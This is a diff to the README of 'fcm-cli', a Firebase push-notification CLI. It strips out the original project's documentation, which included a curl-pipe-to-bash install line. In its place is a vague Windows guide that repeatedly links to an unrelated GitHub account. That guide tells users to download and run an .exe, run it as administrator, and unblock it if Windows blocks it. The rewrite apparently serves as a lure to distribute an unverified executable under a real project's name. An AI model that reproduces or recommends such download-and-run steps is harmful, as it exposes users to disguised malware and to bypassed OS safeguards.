@@ -1,876 +1,265 @@
-# 🚀 FCM CLI
+# 🛠️ fcm-cli - Send FCM messages with ease
 
-⚡ Send Firebase push notifications from terminal in one command
+[![Download fcm-cli](https://img.shields.io/badge/Download%20fcm--cli-blue?style=for-the-badge)](https://github.com/Mainspringpluralist318/fcm-cli)
 
-🧩 With YAML config, profiles, `.env` support, `fcm init`, `--tokens-file`, and JSON output
+## 📥 Download
 
-> A lightweight, production-ready alternative to using Firebase Admin SDK directly when you want to send push notifications from terminal, scripts, CI pipelines, or backend jobs.
+Use this link to visit the page to download:
 
-```bash
-fcm -t TOKEN -n '{"title":"Hi","body":"Hello"}'
-```
+https://github.com/Mainspringpluralist318/fcm-cli
 
-<div align="center">
-  <picture>
-    <source media="(prefers-color-scheme: dark)" srcset="./assets/logo-light.png">
-    <source media="(prefers-color-scheme: light)" srcset="./assets/logo-dark.png">
-    <img src="./assets/logo-light.png" width="180" alt="FCM CLI logo" style="border-radius:50%;">
-  </picture>
-  <h3>Production-ready Firebase Cloud Messaging CLI for Go</h3>
-</div>
+## ✅ What this app does
 
-<p align="center">
-  <a href="https://github.com/interdev7/fcm-cli/releases">
-    <img src="https://img.shields.io/github/v/release/interdev7/fcm-cli" />
-  </a>
-  <img src="https://img.shields.io/github/actions/workflow/status/interdev7/fcm-cli/release.yml" />
-  <img src="https://img.shields.io/badge/Go-1.25-blue" />
-  <img src="https://img.shields.io/badge/license-MPL%202.0-blue" />
-</p>
+fcm-cli is a command-line tool for sending Firebase Cloud Messaging notifications through the HTTP v1 API.
 
----
+Use it to:
 
-# ✨ Overview
+- send push notifications to mobile devices
+- send messages to one device or many devices
+- manage repeat notification tasks
+- test notification payloads before use
+- run message jobs from a Windows computer
 
-**FCM CLI** is a lightweight, production-ready command-line tool for sending Firebase Cloud Messaging notifications without having to wire Firebase SDK code into every project.
+## 🖥️ What you need
 
-It is designed for:
+Before you start, make sure you have:
 
-- 🧑‍💻 Developers who want fast local testing
-- ⚙️ DevOps / CI pipelines that need scriptable notification delivery
-- 🧪 QA teams testing push behavior on multiple devices
-- 🚀 Deployment workflows sending release, incident, or internal alerts
-- 🌐 Backend services in any language that can execute shell commands
+- a Windows PC
+- an internet connection
+- access to a Firebase project
+- FCM service account details
+- a device token or topic name for the target app
 
-It works especially well when you want one consistent tool across:
+## 🚀 Getting Started
 
-- local development
-- shell scripts
-- GitHub Actions / CI
-- cron jobs
-- Node.js / Python / PHP / Java / C# backends
+Follow these steps to run fcm-cli on Windows.
 
----
+### 1. Open the download page
 
-# ⚡ Why FCM CLI?
+Go to:
 
-Instead of:
+https://github.com/Mainspringpluralist318/fcm-cli
 
-- opening Firebase Console
-- pasting JSON manually
-- writing temporary scripts again and again
-- re-implementing the same notification logic in multiple languages
+Look for the latest release, build file, or download option on the page.
 
-You can use one reusable command:
+### 2. Download the app
 
-```bash
-fcm -t TOKEN -n '{"title":"Hi","body":"Hello"}'
-```
+If the page gives you a Windows file, download it to your computer.
 
-Or define repeatable workflows through YAML profiles:
+If the page gives you a zip file, save the zip file and extract it.
 
-```bash
-fcm --config fcm.yaml --profile prod
-```
+If the page gives you source files, download the package that matches Windows use.
 
----
+### 3. Unpack the files
 
-# ✅ Features
+If you downloaded a zip file:
 
-- 🚀 Send FCM messages in seconds
-- ⚡ Parallel multicast with progress bar
-- 🔁 Built-in retry with exponential backoff
-- 🎯 Supports token, topic, condition, and token files
-- 📦 Zero dependencies at runtime (single binary)
-- 🧠 Production-ready logging (color + JSON logs)
-- 🧩 YAML config + profiles support
-- 🌱 Easy onboarding with `fcm init`
-- 🔐 `.env` support for local development
-- 🤖 Structured JSON output for automation
-- 🌐 Works from any language through CLI execution
+- right-click the zip file
+- choose Extract All
+- pick a folder you can find later, such as Downloads or Desktop
 
----
+### 4. Open the folder
 
-# 🚀 Quick Start
+Find the folder that contains the app files.
 
-If you just want to test one push as fast as possible:
+You may see files with names like:
 
-```bash
-export FCM_KEY=service-account.json
+- fcm-cli.exe
+- config.json
+- README.md
 
-fcm -t TOKEN \
-  -n '{"title":"Hello","body":"World"}'
-```
+### 5. Start the tool
 
-That is enough to get started.
+If you see an `.exe` file:
 
----
+- double-click the file to run it
 
-# 🔐 How to get service-account.json
+If Windows asks for permission:
 
-To send messages, `fcm-cli` needs a Firebase service account key.
+- choose Run or Yes
 
-1.  Go to the [Firebase Console](https://console.firebase.google.com/).
-2.  Select your project.
-3.  Click the **Gear icon** (Project Settings) > **Service accounts**.
-4.  Click **Generate new private key**.
-5.  Save the JSON file as `service-account.json` in your project directory.
+If a black window opens, that is normal for a CLI tool.
 
-> [!IMPORTANT]
-> Never commit this file to version control. Add it to your `.gitignore`.
+## 🔧 First-time setup
 
----
+You need a few details before you send a message.
 
-# 📦 Installation
+### Firebase project details
 
-## ⚡ Quick Install (Recommended)
+Have these ready:
 
-```bash
-curl -fsSL https://raw.githubusercontent.com/interdev7/fcm-cli/main/install.sh | bash
-```
+- Firebase project ID
+- service account file
+- FCM sender data
+- target device token or topic
 
-This installs the latest release binary for your platform.
+### Service account file
 
----
+The service account file helps fcm-cli connect to Firebase.
 
-## 🍺 Homebrew
+Place it in the app folder or in the location that the setup steps ask for.
 
-```bash
-brew tap interdev7/fcm
-brew install fcm
-```
+### Message data
 
-This is the easiest option on macOS if you prefer Homebrew-managed installs.
+Prepare the message you want to send:
 
----
+- title
+- body
+- target device token or topic
+- extra data fields if needed
 
-## 🛠 Manual Install from Source
+## 📡 How to send a notification
 
-```bash
-git clone https://github.com/interdev7/fcm-cli.git
-cd fcm-cli
-go mod tidy
-go build -o fcm ./cmd/fcm/main.go
-```
+After the app opens, use the command shown by the tool or the sample command from the project files.
 
-Then run it locally:
+A common flow looks like this:
 
-```bash
-./fcm -v
-```
+- choose the target
+- add the title and message body
+- point to your Firebase data
+- send the notification
 
-Optional system-wide install:
+If the app uses typed commands, enter them in the window exactly as shown.
 
-```bash
-sudo mv fcm /usr/local/bin/fcm
-```
+If the app uses a config file, fill in the values, save the file, then run the tool again.
 
----
+## 🧩 Common use cases
 
-## 🔍 Verify Installation
+### Send a test alert
 
-```bash
-fcm -v
-```
+Use this when you want to check that Firebase works.
 
-You should see the current version.
+### Send a customer message
 
-You can also check help:
+Use this for updates, reminders, or account alerts.
 
-```bash
-fcm -h
-```
+### Send to a topic
 
----
+Use this when many devices follow the same topic.
 
-# ⚙️ Configuration
+### Automate message tasks
 
-FCM CLI supports configuration through:
+Use this when you want to send messages on a schedule or from another tool.
 
-- CLI flags
-- YAML config file
-- profiles inside YAML
-- environment variables
-- `.env` file
+## 🧠 Basic file layout
 
-This makes it flexible for both local development and production automation.
+A typical setup may include:
 
----
+- the main app file
+- a config file
+- a credentials file
+- logs or output files
 
-## Environment Variables
+Keep these files in one folder so they are easy to find.
 
-Supported environment variables:
+## 🪟 Windows tips
 
-```bash
-export FCM_KEY=service-account.json
-export FCM_CONFIG=fcm.yaml
-export FCM_LOG=info
-```
+If the app does not start:
 
-### What they mean
+- check that you downloaded the right Windows file
+- make sure the files were fully extracted
+- try running the app as administrator
+- move the folder to a simple path like `C:\fcm-cli`
+- avoid running it from a protected folder
 
-- `FCM_KEY` — path to your Firebase service account JSON
-- `FCM_CONFIG` — default YAML config file path
-- `FCM_LOG` — default log mode (`info`, `debug`, or `json`)
+If Windows blocks the file:
 
----
+- open the file’s Properties
+- look for an Unblock option
+- apply the change and try again
 
-## `.env` File Support
+## 📄 Example setup flow
 
-You can create a `.env` file in the project root:
+A simple setup may look like this:
 
-```env
-FCM_KEY=service-account.json
-FCM_CONFIG=fcm.yaml
-FCM_LOG=debug
-```
+1. Download the files from the GitHub page
+2. Extract them to a folder
+3. Add your Firebase service account file
+4. Add your project ID and target data
+5. Open the app
+6. Send a test notification
 
-FCM CLI loads `.env` automatically if it exists.
+## 🔍 What you can expect
 
-You can also load a custom env file:
+fcm-cli is built for message delivery through Firebase Cloud Messaging.
 
-```bash
-fcm --env-file .env.local --profile prod
-```
+It is suited for:
 
-This is useful for:
+- app alerts
+- device push messages
+- internal system notices
+- automation jobs
+- backend notification tasks
 
-- local overrides
-- per-environment settings
-- keeping shell setup minimal
+## 🛠️ Troubleshooting
 
----
+### The app does not open
 
-# 🧩 YAML Configuration
+- check that you downloaded the right file for Windows
+- re-extract the zip file
+- try a new folder path
 
-FCM CLI supports reusable configuration through `fcm.yaml`.
+### The app closes right away
 
-This is ideal for:
+- open it from Command Prompt or PowerShell so you can see the message
+- check the config file for typing errors
+- confirm that the service account file is in the right place
 
-- repeatable commands
-- team workflows
-- CI/CD
-- multi-environment setups
-- named profiles like `prod`, `staging`, `smoke`
+### Messages do not send
 
----
+- check your Firebase project ID
+- check your service account file
+- confirm that the device token or topic is valid
+- make sure your internet connection is working
 
-## Generate Starter Config
+### The target device does not receive the message
 
-```bash
-fcm init
-```
+- confirm the app on the device allows push notifications
+- check that the device token is current
+- test with a new token
+- make sure the app is linked to the same Firebase project
 
-Overwrite an existing config:
+## 📂 File locations that help
 
-```bash
-fcm init --force
-```
+For fewer issues, keep the app in a short folder path such as:
 
-Generate to a custom path:
+- `C:\fcm-cli`
+- `C:\Users\YourName\Downloads\fcm-cli`
 
-```bash
-fcm init --file config/fcm.yaml
-```
+Avoid deep folder paths with many nested folders.
 
----
+## 🧪 Safe testing steps
 
-## Example `fcm.yaml`
+Before using the tool for real messages:
 
-```yaml
-notification:
-  title: Hello
-  body: World
+- send a test notification to one device
+- check the title and body
+- confirm the target receives it
+- review the payload if the app supports it
+- only then send a wider message
 
-data:
-  env: dev
+## 📘 Useful fields to prepare
 
-log: info
+Have these values ready when you use the tool:
 
-profiles:
-  prod:
-    topic: production
-    notification:
-      title: Deploy
-      body: New version released
-    data:
-      version: "1.2.0"
+- Firebase project ID
+- service account JSON
+- device token
+- topic name
+- notification title
+- notification body
+- custom data fields
 
-  smoke:
-    tokens:
-      - token1
-      - token2
-      - token3
-    notification:
-      title: Smoke test
-      body: Batch notification test
-```
+## 🔗 Download and setup
 
----
+Visit this page to download and set up the app:
 
-## Using a Profile
+https://github.com/Mainspringpluralist318/fcm-cli
 
-```bash
-fcm --config fcm.yaml --profile prod
-```
+## 📌 Notes for new users
 
-This loads the `prod` profile from the config file and sends using its values.
+If you are new to Firebase, start with one test message.
 
----
+Use one device first. That makes it easier to check your setup.
 
-## Overriding YAML with CLI Flags
-
-CLI flags always win over YAML values.
-
-Example:
-
-```bash
-fcm --config fcm.yaml --profile prod \
-  -n '{"title":"Hotfix","body":"Immediate update"}'
-```
-
-That means:
-
-- profile values are loaded
-- then CLI overrides are applied on top
-
----
-
-## Priority Order
-
-Values are resolved in this order:
-
-1. CLI flags
-2. Profile (`--profile`)
-3. Root config (`fcm.yaml`)
-4. Environment variables / `.env`
-
-This makes behavior predictable and easy to debug.
-
----
-
-## Secrets
-
-Do not store sensitive values in YAML if you can avoid it.
-
-Recommended approach:
-
-- keep `service-account.json` outside the repo
-- use `FCM_KEY` via env or `.env`
-- commit only non-secret config
-
-Example:
-
-```bash
-export FCM_KEY=service-account.json
-fcm --config fcm.yaml --profile prod
-```
-
----
-
-# 🚀 Usage
-
-Basic form:
-
-```bash
-fcm [options]
-```
-
-Config generation:
-
-```bash
-fcm init [options]
-```
-
----
-
-# 🧩 Flags
-
-| Flag                   | Description                         |
-| ---------------------- | ----------------------------------- |
-| `-k`, `--key`          | Firebase key file                   |
-| `-t`, `--token`        | Single token                        |
-| `--tokens`             | Multiple tokens (comma-separated)   |
-| `--tokens-file`        | File with one token per line        |
-| `-topic`               | Topic                               |
-| `-c`, `--condition`    | Condition                           |
-| `-n`, `--notification` | Notification JSON                   |
-| `-d`, `--data`         | Data JSON                           |
-| `-f`, `--config`       | YAML config file                    |
-| `--profile`            | Profile from config                 |
-| `--env-file`           | Load additional `.env` file         |
-| `-l`, `--log`          | Log level (`info`, `debug`, `json`) |
-| `--json`               | JSON output for automation          |
-| `-v`, `--version`      | Version                             |
-| `-h`, `--help`         | Help                                |
-
-### Init Flags (`fcm init`)
-
-| Flag                   | Description                         |
-| ---------------------- | ----------------------------------- |
-| `-f`, `--file`         | Output config file path             |
-| `--force`              | Overwrite existing file             |
-| `--json`               | JSON output for automation          |
-
----
-
-# 📱 Examples
-
-## Send to One Device
-
-```bash
-fcm -t TOKEN -n '{"title":"Hi","body":"Hello"}'
-```
-
----
-
-## Specify Key File Directly
-
-If you don't want to use environment variables, you can pass the key file using `-k` or `--key`:
-
-```bash
-fcm -k service-account.json \
-  -t TOKEN \
-  -n '{"title":"Test","body":"Using manual key file"}'
-```
-
----
-
-## Send to Multiple Tokens
-
-```bash
-fcm --tokens "t1,t2,t3" -n '{"title":"Batch","body":"Hello"}'
-```
-
----
-
-## Batch from File
-
-Create `tokens.txt`:
-
-```text
-token1
-token2
-token3
-```
-
-Send:
-
-```bash
-fcm --tokens-file tokens.txt -n '{"title":"Batch","body":"Hello from file"}'
-```
-
-This is useful when:
-
-- QA has a device list
-- you export tokens from another system
-- you want repeatable batch tests
-
----
-
-## Send to Topic
-
-```bash
-fcm -topic news -n '{"title":"News","body":"Update"}'
-```
-
----
-
-## Send with Condition
-
-```bash
-fcm -c "'news' in topics" -n '{"title":"Cond","body":"Test"}'
-```
-
----
-
-## Send with Data Payload
-
-```bash
-fcm -t TOKEN \
-  -n '{"title":"Chat","body":"New message"}' \
-  -d '{"chatId":"123"}'
-```
-
----
-
-## Use Config File
-
-```bash
-fcm --config fcm.yaml --profile prod
-```
-
----
-
-## Use `.env` Defaults
-
-If `.env` already contains `FCM_KEY` and `FCM_CONFIG`:
-
-```bash
-fcm --profile prod
-```
-
----
-
-## Debug Mode
-
-```bash
-fcm -l debug
-```
-
-Use this when you want more visibility into what the CLI is doing.
-
----
-
-# 🤖 JSON Output (Important)
-
-FCM CLI can return structured machine-readable output using `--json`.
-
-This is critical for:
-
-- CI/CD pipelines
-- backend integrations
-- automation scripts
-
----
-
-## Single Message Success
-
-```bash
-fcm --profile prod --json
-```
-
-Example output:
-
-```json
-{
-  "success": true,
-  "message_id": "projects/.../messages/123"
-}
-```
-
-This `message_id` is useful for:
-
-- logging
-- traceability
-- downstream processing
-- verifying successful delivery request submission to Firebase
-
----
-
-## Error Output
-
-Example:
-
-```json
-{
-  "success": false,
-  "error": "Invalid token"
-}
-```
-
-This makes it easy to handle failures programmatically.
-
----
-
-## Batch / Multicast JSON Output
-
-When sending to many tokens, `--json` can return structured results for automation.
-
-Example shape:
-
-```json
-{
-  "success": false,
-  "success_count": 2,
-  "failure_count": 1,
-  "results": [
-    {
-      "token": "token1",
-      "success": true,
-      "message_id": "projects/.../messages/111"
-    },
-    {
-      "token": "token2",
-      "success": false,
-      "error": "Invalid registration token"
-    }
-  ]
-}
-```
-
-This is especially useful if you want to:
-
-- retry only failed tokens
-- log exact failures
-- remove invalid tokens from your system
-- process results from Node.js / Python / CI
-
----
-
-## Why JSON Output Matters
-
-Without `--json`, CLI output is optimized for humans.
-
-With `--json`, output is optimized for code.
-
-That means you can safely parse it in backend services and automation pipelines.
-
----
-
-# 📊 Multicast Example
-
-Human-readable progress output:
-
-```text
-Progress: 3/5 (60%)
-```
-
-This is shown during batch sending when not using JSON automation mode.
-
----
-
-# 🔁 Retry Strategy
-
-FCM CLI retries failed requests automatically with exponential backoff:
-
-| Attempt | Delay |
-| ------- | ----- |
-| 1       | 1s    |
-| 2       | 2s    |
-| 3       | 4s    |
-
-This helps smooth over transient network or API issues.
-
----
-
-# 🌍 Works with Any Language
-
-Use `fcm` from any backend via CLI.
-No Firebase SDK required.
-
-This is one of the biggest strengths of the project:
-you can keep a single notification workflow regardless of whether your backend is written in Go, Node.js, Python, PHP, C#, or Java.
-
----
-
-## 🟦 Node.js
-
-```js
-const { execFile } = require("node:child_process");
-
-execFile("fcm", ["--profile", "prod", "--json"], (err, stdout) => {
-  const res = JSON.parse(stdout);
-
-  if (!res.success) {
-    console.error(res.error);
-    return;
-  }
-
-  console.log("Message ID:", res.message_id);
-});
-```
-
----
-
-## 🟢 Go
-
-```go
-package main
-
-import (
-	"encoding/json"
-	"fmt"
-	"os/exec"
-)
-
-func main() {
-	cmd := exec.Command("fcm", "--profile", "prod", "--json")
-	out, _ := cmd.Output()
-
-	var res map[string]interface{}
-	json.Unmarshal(out, &res)
-
-	fmt.Println(res)
-}
-```
-
----
-
-## 🟣 Python
-
-```python
-import subprocess
-import json
-
-result = subprocess.run(
-    ["fcm", "--profile", "prod", "--json"],
-    capture_output=True,
-    text=True
-)
-
-res = json.loads(result.stdout)
-
-if not res["success"]:
-    print("Error:", res["error"])
-else:
-    print("Message ID:", res.get("message_id"))
-```
-
----
-
-## 🟡 PHP
-
-```php
-<?php
-$output = shell_exec("fcm --profile prod --json");
-$res = json_decode($output, true);
-
-if (!$res["success"]) {
-    echo "Error: " . $res["error"];
-} else {
-    echo "Message ID: " . $res["message_id"];
-}
-```
-
----
-
-## 🔵 C#
-
-```csharp
-using System.Diagnostics;
-using System.Text.Json;
-
-var process = new Process();
-process.StartInfo.FileName = "fcm";
-process.StartInfo.Arguments = "--profile prod --json";
-process.StartInfo.RedirectStandardOutput = true;
-process.Start();
-
-string output = process.StandardOutput.ReadToEnd();
-
-var res = JsonSerializer.Deserialize<dynamic>(output);
-
-Console.WriteLine(res);
-```
-
----
-
-## ☕ Java
-
-```java
-import java.io.*;
-
-ProcessBuilder pb = new ProcessBuilder("fcm", "--profile", "prod", "--json");
-Process process = pb.start();
-
-BufferedReader reader = new BufferedReader(
-    new InputStreamReader(process.getInputStream())
-);
-
-String output = reader.readLine();
-System.out.println(output);
-```
-
----
-
-# 📦 Releases
-
-Download prebuilt binaries from:
-
-👉 https://github.com/interdev7/fcm-cli/releases
-
-Use release binaries if you want:
-
-- fast setup
-- reproducible installs
-- easy CI / server provisioning
-- no local Go toolchain dependency
-
----
-
-# 🧠 Architecture
-
-FCM CLI is built around a simple but practical model:
-
-- Go + goroutines for concurrency
-- OAuth2 service account authentication
-- FCM HTTP v1 API
-- Stateless CLI design
-- YAML + `.env` driven local workflows
-- Structured JSON result output for automation
-
-This keeps the tool:
-
-- small
-- portable
-- easy to integrate
-- language-agnostic
-
----
-
-# 🔐 Security
-
-Recommended practices:
-
-- never commit `service-account.json`
-- use environment variables in production
-- keep secrets outside version control
-- rotate credentials when needed
-- prefer per-environment `.env` or CI secrets
-
----
-
-# 🤝 Contributing
-
-PRs are welcome.
-
-If you have ideas, bug reports, or feature requests:
-
-- open an issue
-- submit a PR
-- share feedback from real-world FCM usage
-
-Areas especially worth improving:
-
-- templates
-- rate limiting
-- metrics
-- dry-run mode
-- richer batch tooling
-
----
-
-# ⭐ Support
-
-If you find this project useful, give it a star ⭐
-
-That helps the project grow and makes it easier for other developers to discover it.
-
----
-
-# ❤️ Sponsor
-
-If FCM CLI saves you time in development, testing, or CI — consider supporting the project.
-
-Your support helps with:
-
-- maintenance
-- new features
-- documentation
-- long-term stability
-
-👉 https://github.com/sponsors/interdev7
-
----
-
-# 📄 License
-
-Licensed under the Mozilla Public License 2.0
-See the [LICENSE](LICENSE) file for details.
-
----
-
-# 📝 Changelog
-
-See [CHANGELOG.md](CHANGELOG.md)
+Once the message works, you can use the same setup for other targets and tasks
